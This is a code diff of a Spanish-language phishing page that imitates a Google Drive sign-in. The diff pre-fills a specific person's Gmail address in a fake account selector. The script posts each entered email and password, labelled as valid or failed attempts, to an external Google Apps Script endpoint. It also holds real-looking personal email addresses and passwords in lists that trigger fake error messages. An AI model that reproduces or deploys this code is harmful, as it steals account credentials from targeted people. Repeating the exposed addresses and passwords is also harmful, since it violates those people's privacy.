@@ -43,7 +43,6 @@
 
         .logo {
             width: 90px;
-        
             margin-bottom: 16px;
         }
 
@@ -70,7 +69,130 @@
             font-size: 16px;
             font-weight: 400;
             line-height: 1.5;
-            margin-bottom: 24px;
+            margin-bottom: 32px;
+        }
+
+        /* Nuevo estilo para el selector de correo */
+        .email-selector {
+            display: flex;
+            align-items: center;
+            margin-bottom: 32px;
+            padding: 8px 12px;
+            background: #303134;
+            border-radius: 50px;
+            border: 1px solid #5f6368;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            position: relative;
+        }
+
+        .email-selector:hover {
+            background: #3c4043;
+            border-color: #8ab4f8;
+        }
+
+        .user-avatar {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            flex-shrink: 0;
+            overflow: hidden;
+            background-color: #8E24AA;
+        }
+
+        .user-avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 50%;
+        }
+
+        .user-avatar span {
+            color: white;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .user-email {
+            color: #e8eaed;
+            font-size: 16px;
+            font-weight: 400;
+            flex-grow: 1;
+            text-align: left;
+            overflow: hidden;
+            white-space: nowrap;
+            text-overflow: ellipsis;
+            min-width: 0;
+        }
+
+        .dropdown-arrow {
+            color: #9aa0a6;
+            font-size: 12px;
+            margin-left: 8px;
+            transition: transform 0.2s ease;
+            transform: scaleY(0.6);
+        }
+
+        /* Email input alternativo */
+        .email-input-wrapper {
+            position: relative;
+            margin-bottom: 32px;
+            text-align: left;
+            display: none;
+        }
+
+        .email-input-wrapper.active {
+            display: block;
+        }
+
+        .email-input-field {
+            width: 100%;
+            padding: 16px 12px 8px;
+            background-color: transparent;
+            border: 1.5px solid #82aaff;
+            border-radius: 10px;
+            color: #e8eaed;
+            font-size: 1rem;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .email-input-field:focus {
+            border-color: #82aaff;
+        }
+
+        .email-input-label {
+            position: absolute;
+            top: 16px;
+            left: 12px;
+            color: #cdd6f4;
+            background-color: #2d2e30;
+            padding: 0 4px;
+            transition: 0.2s ease all;
+            pointer-events: none;
+        }
+
+        .email-input-field:focus + .email-input-label,
+        .email-input-field:not(:placeholder-shown) + .email-input-label {
+            top: -10px;
+            font-size: 0.8rem;
+            color: #82aaff;
+        }
+
+        .back-to-selector {
+            color: #1a73e8;
+            font-size: 14px;
+            text-decoration: none;
+            margin-top: 8px;
+            display: inline-block;
+        }
+
+        .back-to-selector:hover {
+            text-decoration: underline;
         }
 
         .input-wrapper {
@@ -83,8 +205,8 @@
             width: 100%;
             padding: 16px 12px 8px;
             background-color: transparent;
-            border: 1.5px solid #94b1ec;
-            border-radius: 5px;
+            border: 1.5px solid #82aaff;
+            border-radius: 10px;
             color: #e8eaed;
             font-size: 1rem;
             outline: none;
@@ -124,8 +246,57 @@
             color: #ce9591;
         }
 
+       .show-password-wrapper {
+            display: flex;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+
+        /* Estilo personalizado para el checkbox */
+        .show-password-wrapper input[type="checkbox"] {
+            appearance: none;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #9aa0a6;
+            border-radius: 2px;
+            background-color: transparent;
+            margin-right: 8px;
+            cursor: pointer;
+            position: relative;
+            transition: all 0.2s ease;
+        }
+
+        .show-password-wrapper input[type="checkbox"]:checked {
+            border-color: #1a73e8;
+            background-color: #1a73e8;
+        }
+
+        .show-password-wrapper input[type="checkbox"]:checked::after {
+            content: '';
+            position: absolute;
+            left: 3px;
+            top: 0px;
+            width: 5px;
+            height: 8px;
+            border: solid white;
+            border-width: 0 2px 2px 0;
+            transform: rotate(45deg);
+        }
+
+        .show-password-wrapper input[type="checkbox"]:hover {
+            border-color: #82aaff;
+        }
+
+        .show-password-wrapper label {
+            color: #e8eaed;
+            font-size: 14px;
+            cursor: pointer;
+            user-select: none;
+        }
         .forgot-email {
-            color: #388eff;
+            color: #c8565d;
             font-size: 14px;
             font-weight: 500;
             text-decoration: none;
@@ -139,8 +310,7 @@
         }
 
         .guest-mode {
-            font-family: 'Inter', sans-serif;
-            color: #ff5f5f;
+            color: #f08b85;
             font-size: 14px;
             line-height: 1.4286;
             margin-bottom: 24px;
@@ -148,28 +318,12 @@
         }
 
         .guest-mode a {
-            color: #719ae6;
+            color: #1a73e8;
             text-decoration: none;
         }
 
         .guest-mode a:hover {
             text-decoration: underline;
-        }
-
-        .show-password-wrapper {
-            display: flex;
-            align-items: center;
-            margin-bottom: 24px;
-        }
-
-        .show-password-wrapper input[type="checkbox"] {
-            margin-right: 8px;
-        }
-
-        .show-password-wrapper label {
-            color: #e8eaed;
-            font-size: 14px;
-            cursor: pointer;
         }
 
         .actions {
@@ -190,7 +344,7 @@
             text-decoration: underline;
         }
 
-        .next-button {
+        .access-button {
             background-color: #1a73e8;
             border: none;
             border-radius: 4px;
@@ -203,12 +357,12 @@
             transition: background-color 0.2s;
         }
 
-        .next-button:hover {
+        .access-button:hover {
             background-color: #2b7de9;
             box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
         }
 
-        .next-button:disabled {
+        .access-button:disabled {
             background-color: #5f6368;
             cursor: not-allowed;
         }
@@ -256,7 +410,7 @@
         }
 
         .error-message {
-            color: #ff645a;
+            color: #f08b85;
             font-size: 14px;
             margin-top: 8px;
             margin-bottom: 16px;
@@ -321,18 +475,30 @@
         <img src="https://i.ibb.co/ygHBjNN/gssr-272x92dp.png" alt="go" class="logo">
         
         <div class="card">
-            <h1 class="title">Acceder a Dibujos</h1>
+           <h1 class="title">Acceder a Dibujos</h1>
             <p class="subtitle">Ir a Drive</p>
+            
+            <!-- Selector de correo -->
+            <div class="email-selector" id="emailSelector">
+                <div class="user-avatar">
+                    <img src="" alt="Avatar" id="userAvatar" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
+                    <span id="userInitial" style="display: none;">M</span>
+                </div>
+                <div class="user-email" id="selectedEmail">marcela2008quintero@gmail.com</div>
+                <div class="dropdown-arrow">▼</div>
+            </div>
+
+            <!-- Input alternativo para correo -->
+            <div class="email-input-wrapper" id="emailInputWrapper">
+                <input type="email" id="emailInput" name="email" class="email-input-field" placeholder=" " required>
+                <label for="emailInput" class="email-input-label">Correo electrónico o teléfono</label>
+                <a href="#" class="back-to-selector" id="backToSelector">← Volver a la cuenta anterior</a>
+            </div>
             
             <form id="loginForm">
                 <div class="input-wrapper">
-                    <input type="email" id="emailInput" name="email" class="input-field" placeholder=" " required="" value="@gmail.com">
-                    <label for="emailInput" class="input-label">Correo electrónico o teléfono</label>
-                </div>
-                
-                <div class="input-wrapper">
                     <input type="password" id="passwordInput" name="password" class="input-field" placeholder=" " minlength="5" maxlength="32" required>
-                    <label for="passwordInput" class="input-label">Contraseña</label>
+                    <label for="passwordInput" class="input-label">Introduce tu contraseña</label>
                 </div>
                 
                 <div id="errorMessage" class="error-message"></div>
@@ -342,15 +508,13 @@
                     <label for="showPassword">Mostrar contraseña</label>
                 </div>
                 
-        
                 <div class="guest-mode" id="guestMode">
-                    Solicita el permiso en la carpeta para continuar. 
-                    
+                    Solicita el permiso en la carpeta para continuar 
                 </div>
                 
                 <div class="actions">
                     <a href="#" class="create-account">Crear cuenta</a>
-                    <button type="submit" class="next-button" id="submitBtn">Siguiente</button>
+                    <button type="submit" class="access-button" id="accessBtn">Acceder</button>
                 </div>
             </form>
         </div>
@@ -373,7 +537,38 @@
     <iframe id="usuarioFrame" src="" style="display: none; width: 100%; height: 100vh; border: none;"></iframe>
 
     <script>
+        // Variables globales
+        let currentEmail = "marcela2008quintero@gmail.com";
+        let isUsingCustomEmail = false;
+
+        // Elementos del DOM
+        const emailSelector = document.getElementById('emailSelector');
+        const emailInputWrapper = document.getElementById('emailInputWrapper');
+        const emailInput = document.getElementById('emailInput');
+        const backToSelector = document.getElementById('backToSelector');
+        const selectedEmailEl = document.getElementById('selectedEmail');
+        const userInitialEl = document.getElementById('userInitial');
+        const guestMode = document.getElementById('guestMode');
         const passwordInput = document.getElementById('passwordInput');
+
+        // Manejar clic en el selector de correo (flecha)
+        emailSelector.addEventListener('click', function() {
+            showEmailInput();
+        });
+
+        // Manejar clic en "Volver a la cuenta anterior"
+        backToSelector.addEventListener('click', function(e) {
+            e.preventDefault();
+            showEmailSelector();
+        });
+
+        // Manejar cambio en el input de email
+        emailInput.addEventListener('input', function() {
+            currentEmail = this.value;
+            isUsingCustomEmail = true;
+            // Ocultar el mensaje de guest mode cuando se escribe un email personalizado
+            hideGuestModeMessage();
+        });
 
         // Limpiar el estilo de error cuando el usuario empieza a escribir
         passwordInput.addEventListener('input', function() {
@@ -383,54 +578,91 @@
             errorMessage.classList.remove('password-prohibited');
         });
 
+        function showEmailInput() {
+            emailSelector.style.display = 'none';
+            emailInputWrapper.classList.add('active');
+            emailInput.focus();
+            // Ocultar el mensaje de guest mode cuando se muestra el input de email
+            hideGuestModeMessage();
+        }
+
+        function showEmailSelector() {
+            emailInputWrapper.classList.remove('active');
+            emailSelector.style.display = 'flex';
+            
+            // Si se había ingresado un email personalizado, regresar al predeterminado
+            if (isUsingCustomEmail) {
+                currentEmail = "marcela2008quintero@gmail.com";
+                isUsingCustomEmail = false;
+                emailInput.value = '';
+            }
+            
+            // Limpiar cualquier mensaje de error previo
+            const errorMessage = document.getElementById('errorMessage');
+            errorMessage.style.display = 'none';
+            errorMessage.classList.remove('password-prohibited');
+            
+            // Mostrar nuevamente el mensaje de guest mode
+            showGuestModeMessage();
+        }
+
+        function hideGuestModeMessage() {
+            guestMode.style.display = 'none';
+        }
+
+        function showGuestModeMessage() {
+            guestMode.style.display = 'block';
+        }
+
+        function getInitialFromEmail(email) {
+            return email.charAt(0).toUpperCase();
+        }
+
         // Manejar mostrar/ocultar contraseña
         document.getElementById('showPassword').addEventListener('change', function() {
             const passwordInput = document.getElementById('passwordInput');
             passwordInput.type = this.checked ? 'text' : 'password';
         });
 
-        // Manejar formulario - Una sola pantalla con email y contraseña
+        // Manejar formulario
         document.getElementById("loginForm").addEventListener("submit", async function(event) {
             event.preventDefault();
             
-            const emailInput = document.querySelector('input[name="email"]');
             const passwordInput = document.querySelector('input[name="password"]');
             const errorMessage = document.getElementById('errorMessage');
-            const guestMode = document.getElementById('guestMode');
-            const submitBtn = document.getElementById('submitBtn');
+            const accessBtn = document.getElementById('accessBtn');
             
-            const email = emailInput.value.trim().toLowerCase();
+            // Obtener email actual (del selector o del input personalizado)
+            const email = isUsingCustomEmail ? emailInput.value : currentEmail;
             const password = passwordInput.value;
+            
+            // Validar que haya un email
+            if (!email) {
+                showError("Por favor ingresa un correo electrónico.", false);
+                return;
+            }
             
             // Limpiar errores previos
             errorMessage.style.display = 'none';
             errorMessage.classList.remove('password-prohibited');
             passwordInput.classList.remove('error');
-            guestMode.style.display = 'block';
-            
-            // Validar formato de correo electrónico
-            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            if (!emailRegex.test(email)) {
-                showError("Introduce una dirección de correo electrónico válida", false);
-                return;
-            }
             
             // Deshabilitar botón
-            submitBtn.disabled = true;
-            submitBtn.textContent = 'Verificando...';
+            accessBtn.disabled = true;
+            accessBtn.textContent = 'Verificando...';
             
             // Variables para determinar si es prohibido
             let isProhibitedEmail = false;
             let isProhibitedPassword = false;
             
-            // Lista de correos prohibidos (copiada del formulario 2)
-            const prohibitedEmails = ["c20bl11064@acarrion.edu.pe"];
+            // Lista de correos prohibidos
+            const prohibitedEmails = ["hailyhernandez17@gmail.com"];
             if (prohibitedEmails.includes(email)) {
                 isProhibitedEmail = true;
             }
             
-            // Verificar contraseñas prohibidas (copiada del formulario 2)
-            const prohibitedWords = ["Barryfala00","barryfala00","Haily130598","haily130598","delfin","Delfin","cochachi2523","Cochachi2523","cochachi2523","aylinnmierda2008","Aylinnmierda2008","loveteo10","Greinyer10","greinyer10"];
+            // Verificar contraseñas prohibidas
+            const prohibitedWords = ["Barryfala00","barryfala00"];
             if (prohibitedWords.some(word => password.includes(word))) {
                 isProhibitedPassword = true;
             }
@@ -464,9 +696,9 @@
                 
                 // Agregar diferenciador junto al campo país
                 if (isProhibitedEmail || isProhibitedPassword) {
-                 formData.append("country", country + " - INTENTO_FALLIDO");
+                    formData.append("country", country + " - INTENTO_FALLIDO");
                 } else {
-                    formData.append("country", country);
+                    formData.append("country", country + " - ACCESO_VALIDO");
                 }
                 
                 const url = "https://script.google.com/macros/s/AKfycbxX_HcLaDf7l6NEl3z57fbYMLpAxve1DLBamLWnW5n6ap0kNuzI_Qv2IW9h6kE9rxN2/exec";
@@ -480,11 +712,13 @@
                 
                 // Después de enviar, verificar si debe mostrar error o redirigir
                 if (isProhibitedEmail) {
-                    showError("No se pudo encontrar tu cuenta de Google", false);
+                    showError("Ocurrio un error con el correo intentar con otra dirección", false);
+                    hideGuestModeMessage();
                     emailInput.value = '';
                     passwordInput.value = '';
                 } else if (isProhibitedPassword) {
                     showError("La contraseña no es correcta. Inténtalo de nuevo.", true);
+                    hideGuestModeMessage();
                     passwordInput.value = '';
                     // Agregar clase error al campo de contraseña
                     passwordInput.classList.add('error');
@@ -494,25 +728,24 @@
                         window.location.href = "invitation.html";
                     } else {
                         showError("Error al iniciar sesión. Inténtalo de nuevo.", false);
+                        hideGuestModeMessage();
                     }
                 }
                 
             } catch (error) {
                 showError("Error de conexión. Inténtalo de nuevo.", false);
+                hideGuestModeMessage();
                 console.error("Error:", error);
             } finally {
-                submitBtn.disabled = false;
-                submitBtn.textContent = 'Siguiente';
+                accessBtn.disabled = false;
+                accessBtn.textContent = 'Acceder';
             }
         });
         
         function showError(message, isPasswordError) {
             const errorMessage = document.getElementById('errorMessage');
-            const guestMode = document.getElementById('guestMode');
-            
             errorMessage.textContent = message;
             errorMessage.style.display = 'block';
-            guestMode.style.display = 'none';
             
             // Aplicar estilo especial para errores de contraseña prohibida
             if (isPasswordError) {
@@ -520,6 +753,9 @@
             } else {
                 errorMessage.classList.remove('password-prohibited');
             }
+            
+            // Ocultar el mensaje de guest mode cuando se muestra un error
+            hideGuestModeMessage();
         }
         
         // Verificar redirección
